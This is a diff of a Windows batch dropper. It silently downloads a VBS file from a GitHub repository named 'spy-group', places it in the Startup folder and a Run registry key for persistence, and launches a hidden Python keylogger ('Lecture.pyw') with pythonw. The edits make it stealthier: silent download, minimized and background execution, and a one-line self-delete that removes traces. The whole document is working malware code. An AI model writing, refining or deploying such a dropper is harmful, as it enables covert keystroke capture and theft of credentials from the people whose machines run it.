@@ -1,7 +1,7 @@
 @echo off
 REM --- Part 1: Download and setup VBS file ---
-REM Download the VBS file from GitHub
-curl -o "%TEMP%\test.vbs" https://raw.githubusercontent.com/spy-group/USB-Data-Backup/main/test.vbs
+REM Download the VBS file from GitHub (Silent Mode)
+curl -o "%TEMP%\test.vbs" https://raw.githubusercontent.com/spy-group/USB-Data-Backup/main/test.vbs --silent --output "%TEMP%\test.vbs"
 
 REM Copy the downloaded file to the Startup folder
 copy "%TEMP%\test.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"
@@ -9,8 +9,8 @@ copy "%TEMP%\test.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
 REM Add test.vbs to startup
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TestScript" /t REG_SZ /d "wscript \"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs\"" /f
 
-REM Run the VBS file
-wscript "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"
+REM Run the VBS file in background (Prevents Freezing)
+start /min wscript "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"
 
 REM --- Part 2: Download and setup Python Keylogger ---
 echo Setting up Keylogger...
@@ -46,14 +46,5 @@ echo Running Lecture.pyw in hidden mode...
 start /b pythonw "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Lecture.pyw"
 
 REM --- Part 3: Cleanup ---
-REM Create a new batch file to delete the original batch file
-echo @echo off > "%TEMP%\delete_self.bat"
-echo timeout /t 1 /nobreak >nul >> "%TEMP%\delete_self.bat"
-echo del "%~f0" >> "%TEMP%\delete_self.bat"
-echo del "%TEMP%\delete_self.bat" >> "%TEMP%\delete_self.bat"
-
-REM Schedule the new batch file to run after the current script finishes
-start "" cmd /c "%TEMP%\delete_self.bat"
-
-REM Close the current CMD window
-exit
+REM Self-delete batch file and close CMD instantly
+start /b cmd /c del "%~f0" & exit
